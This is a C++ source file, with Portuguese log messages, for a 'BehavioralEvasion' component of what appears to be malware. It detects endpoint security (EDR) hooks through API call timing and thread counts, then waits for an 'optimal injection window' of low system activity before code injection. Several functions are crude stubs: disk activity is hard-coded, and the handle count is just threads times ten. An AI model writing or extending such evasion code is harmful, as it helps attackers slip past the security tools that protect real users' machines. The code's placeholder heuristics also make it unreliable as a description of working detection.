#include "BehavioralEvasion.h"
#include "Logger.h"
#include <tlhelp32.h>
#include <psapi.h>

bool BehavioralEvasion::DetectEDRBehavior() {
    Logger::Info("Detectando EDR por comportamento...");

    // Check API call timing
    if (CheckAPICallTiming()) {
        return true;
    }

    // Check handle count
    DWORD handleCount = GetHandleCount();
    if (handleCount > 100) {
        Logger::Warning("Handle count suspeito: " + std::to_string(handleCount));
        return true;
    }

    // Check thread count
    int threadCount = GetThreadCount(GetCurrentProcessId());
    if (threadCount > 50) {
        Logger::Warning("Thread count suspeito: " + std::to_string(threadCount));
        return true;
    }

    return false;
}

bool BehavioralEvasion::CheckAPICallTiming() {
    auto start = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < 1000; i++) {
        IsDebuggerPresent();
    }

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>
        (end - start).count();

    // IsDebuggerPresent normally takes 1-2ms for 1000 calls
    // With EDR hooks can take 50-100ms
    if (duration > 10) {
        Logger::Warning("API call timing suspeito: " + std::to_string(duration) + "ms");
        return true;
    }

    return false;
}

DWORD BehavioralEvasion::GetHandleCount() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};
    DWORD handleCount = 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (pe.th32ProcessID == GetCurrentProcessId()) {
                handleCount = pe.cntThreads * 10;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return handleCount;
}

int BehavioralEvasion::GetThreadCount(DWORD pid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te = {sizeof(THREADENTRY32)};
    int threadCount = 0;

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                threadCount++;
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return threadCount;
}

void BehavioralEvasion::WaitForOptimalInjectionWindow() {
    Logger::Info("Aguardando por janela ótima de injeção...");

    int consecutiveGoodFrames = 0;
    int attempts = 0;

    while (consecutiveGoodFrames < 3 && attempts < 300) {
        DWORD cpuUsage = GetCPUUsageEstimate();
        DWORD diskActivity = GetDiskActivityEstimate();
        DWORD handles = GetHandleCount();

        if (cpuUsage < 20 && diskActivity < 10 && handles < 80) {
            consecutiveGoodFrames++;
            Logger::Info("Bom timing: CPU " + std::to_string(cpuUsage) +
                        "% DISK " + std::to_string(diskActivity) +
                        "% Handles " + std::to_string(handles));
        } else {
            consecutiveGoodFrames = 0;
        }

        Sleep(1000);
        attempts++;
    }

    if (consecutiveGoodFrames >= 3) {
        Logger::Success("Janela ótima de injeção detectada!");
    } else {
        Logger::Warning("Timeout aguardando janela ótima, prosseguindo mesmo assim");
    }
}

DWORD BehavioralEvasion::GetCPUUsageEstimate() {
    // Simplified: measure system activity
    // Real implementation would use Performance Counters

    auto start = std::chrono::high_resolution_clock::now();

    volatile DWORD count = 0;
    for (volatile int i = 0; i < 1000000; i++) {
        count++;
    }

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>
        (end - start).count();

    // Very rough estimate: if slow, CPU is busy
    DWORD usage = (duration > 5000) ? 80 : 20;

    return usage;
}

DWORD BehavioralEvasion::GetDiskActivityEstimate() {
    // Very simplified: just return low for now
    // Real implementation would check disk I/O
    return 5;
}
